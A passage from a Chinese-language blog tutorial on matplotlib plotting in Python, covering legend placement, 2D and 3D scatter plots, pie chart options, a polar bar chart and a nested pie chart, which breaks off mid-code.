<span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'center right'</span> <span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'lower center'</span> <span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'upper center'</span> <span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'center'</span>       <span class="token punctuation">:</span> <span class="token number">10</span><span class="token comment">#实际上bbox_to_anchor()函数的范围是(0,1),也就是将整张图看做1 * 1大小</span><span class="token comment">#对于两个元素的bbox_to_anchor()，也就是(x,y)，这个参数是代表了lengend_box的起点，并且是有后面的loc决定 的。</span><span class="token comment">#例如，设置(0.5,0.5), loc='center'，那么代表lengend_box的中心点（center）坐标是(0.5, 0.5)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-5-散点图"><a href="#5-5-散点图" class="headerlink" title="5.5 散点图"></a>5.5 散点图</h2><p>在实际数据分析应用中，散点图是一种常用于观测数据的相关性的数据可视化方式。数据的相关性通常有正相关、负相关及不相关。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token punctuation">,</span> c <span class="token punctuation">,</span>marker<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拓展：三维散点图"><a href="#拓展：三维散点图" class="headerlink" title="拓展：三维散点图"></a>拓展：三维散点图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> mpl_toolkits<span class="token punctuation">.</span>mplot3d <span class="token keyword">import</span> Axes3D  <span class="token comment"># 空间三维画图</span><span class="token comment"># 数据１</span>data1 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># [ 0  3  6  9 12 15 18 21]</span>y1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># [ 1  4  7 10 13 16 19 22]</span>z1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># [ 2  5  8 11 14 17 20 23]</span><span class="token comment"># 数据２</span>data2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>z2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token comment"># 绘制散点图</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax <span class="token operator">=</span> Axes3D<span class="token punctuation">(</span>fig<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> z1<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'顺序点'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'随机点'</span><span class="token punctuation">)</span><span class="token comment"># 绘制图例</span>ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">)</span><span class="token comment"># 添加坐标轴(顺序是Z, Y, X)</span>ax<span class="token punctuation">.</span>set_zlabel<span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 展示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_18.png"></p><p>拓展三维散点图，就要讲到matplotlib库里的另一个模块，mpl_toolkits.mplot3d，这个本身就来源于matplotlib不需要再行安装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>xs<span class="token punctuation">,</span> ys<span class="token punctuation">,</span> zs<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> depthshade<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">*</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>xs,ys,zs：输入数据；</li><li>s:scatter点的尺寸</li><li>c:颜色，如c = ‘r’就是红色；</li><li>depthshase:透明化，True为透明，默认为True，False为不透明</li><li>*args等为扩展变量，如maker = ‘o’，则scatter结果为’o‘的形状</li></ul><p>我们可以看到同一个函数的参数列表基本一致。三维散点图与二维散点图的去别在于需要使用Axes3D对象或使用projection =’3d’关键字的任何其他轴一样创建。 创建一个新的matplotlib.figure.Figure并为其添加一个类型为Axes3D的新轴。</p><h2 id="5-6-饼图"><a href="#5-6-饼图" class="headerlink" title="5 . 6  饼图"></a>5 . 6  饼图</h2><p>由于我在制作过程中发现图片使用过多真的太大了，所以后面的代码除了我重点想为大家拓展的，其他会直接进行演示</p><p>饼图是一种将各项数据的大小与各项数据的总和的比例显示在一张饼中的数据可视化方式。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span> explode<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> colors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> autopct<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> pctdistance<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> labeldistance<span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> counterclock<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> frame<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span>tuchu<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>explode<span class="token operator">=</span>tuchu<span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个实例添加了两个参数，explode=tuchu, shadow=True,<code>explode=tuchu</code>控制突出显示效果，<del>其实这个突出效果是用便宜实现的，可以自己设置偏移量的多少</del>，<code>shadow=True</code>控制添加阴影效果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span>tuchu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>explode<span class="token operator">=</span>tuchu<span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">"%0.1f%%"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本实例通过autopct=”%0.1f%%显示数据标签，其中%0.1f指定显示小数点后一位的浮点数，后面的两个%%用于显示一个%号，通过plt.legend()控制了显示图例。</p><h3 id="拓展：极轴饼图"><a href="#拓展：极轴饼图" class="headerlink" title="拓展：极轴饼图"></a>拓展：极轴饼图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltnp<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">19680801</span><span class="token punctuation">)</span><span class="token comment">#生成随机数</span>N <span class="token operator">=</span> <span class="token number">10</span><span class="token comment">#显示几个圆圈</span>theta <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> N<span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>radii <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token comment">#</span>width <span class="token operator">=</span> np<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">#在添加projection='polar'之后解释器会自动绘制出一张即坐标图</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">,</span> projection<span class="token operator">=</span>‘polar’<span class="token punctuation">)</span><span class="token comment">#bars = ax.bar(theta, radii, width=width, bottom=0.0)</span><span class="token comment">#前三个参数分别对应left,height,width,left表示从哪开始，表示开始 位置，</span><span class="token comment">#height表示从中心点向边缘绘制的长度</span>bars <span class="token operator">=</span> ax<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>theta<span class="token punctuation">,</span> radii<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> bottom<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token comment">#left表示从哪开始，</span><span class="token comment">#radii表示从中心点向边缘绘制的长度（半径）</span><span class="token comment">#width表示末端的弧长</span><span class="token comment">#bottom意思是底部</span><span class="token comment">#自定义颜色和不透明度，下面代码是在极坐标系中画出扇形图的</span><span class="token keyword">for</span> r<span class="token punctuation">,</span> bar <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>radii<span class="token punctuation">,</span> bars<span class="token punctuation">)</span><span class="token punctuation">:</span>bar<span class="token punctuation">.</span>set_facecolor<span class="token punctuation">(</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>viridis<span class="token punctuation">(</span>r<span class="token operator">/</span><span class="token number">11</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#定义颜色r/10.代表颜色与半径有关</span>bar<span class="token punctuation">.</span>set_alpha<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment">#定义不透明度，越小越透明</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_19.png"></p><h3 id="拓展-多层嵌套饼图"><a href="#拓展-多层嵌套饼图" class="headerlink" title="拓展: 多层嵌套饼图"></a>拓展: 多层嵌套饼图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npsize <span class="token operator">=</span> <span class="token number">0.25</span>base <span class="token operator">=</span> <span class="token number">50</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>vals_middle <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">47.5</span><span class="token punctuation">,</span> <span class="token number">11.7</span><span class="token punctuation">,</span> <span class="token number">15.2</span><span class="token punctuation">,</span> <span class="token number">9.6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">44.8</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">9.2</span><span class="token punctuation">,</span> <span class="token number">68.5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">7.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.7</span><span class="token punctuation">,</span> <span class="token number">18.9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>vals_outer <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">47.5</span><span class="token punctuation">,</span> <span class="token number">11.7</span><span class="token punctuation">,</span> <span class="token number">15.2</span><span class="token punctuation">,</span> <span class="token number">9.6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36.6</span><span class="token punctuation">,</span> <span class="token number">8.2</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">9.2</span><span class="token punctuation">,</span> <span class="token number">38.1</span><span class="token punctuation">,</span> <span class="token number">30.4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">5.8</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.7</span><span class="token punctuation">,</span> <span class="token number">18.9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>vals_inner <span class="token operator">=</span> vals_middle<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 最内圈使用的数值为内圈各类数据加上base</span>vals_first <span class="token operator">=</span> vals_inner <span class="token operator">+</span> base<span class="token triple-quoted-string string">'''第二圈使用的数值, 因为最内圈每个类别都加上了base, 所以为了确保第二圈的数值和内圈相匹配, 第二圈的各类别要按照各自所占的比例分配各类的总数值.'''</span>vals_second <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s_a <span class="token operator">=</span> vals_first<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_b <span class="token operator">=</span> vals_middle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 如果第二圈某类总数值为0, 则分配base.</span>    <span class="token keyword">if</span> s_b <span class="token operator">==</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        vals_second<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vals_second<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>vals_middle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> s_b<span class="token punctuation">)</span> <span class="token operator">*</span> s_a<span class="token comment"># 第三圈使用的数值, 和上方同理</span>vals_third <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s_a <span class="token operator">=</span> vals_first<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_b <span class="token operator">=</span> vals_outer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> s_b <span class="token operator">==</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        vals_third<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vals_third<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>vals_outer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> s_b<span class="token punctuation">)</span> <span class="token operator">*</span> s_a<span class="token comment"># 获取colormap tab20c和tab20b的颜色</span>cmap_c <span class="token operator">=</span> 